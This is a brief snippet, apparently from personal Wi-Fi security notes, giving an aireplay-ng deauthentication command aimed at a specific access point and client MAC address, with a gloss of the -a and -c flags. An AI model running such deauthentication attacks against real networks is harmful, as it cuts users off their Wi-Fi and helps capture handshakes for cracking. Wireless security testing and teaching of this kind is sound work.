* Deauth the client with aireplay-ng
@code bash
sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
@end

  -a -> is BSSID target Access point
  -c -> is the client connected to it
___

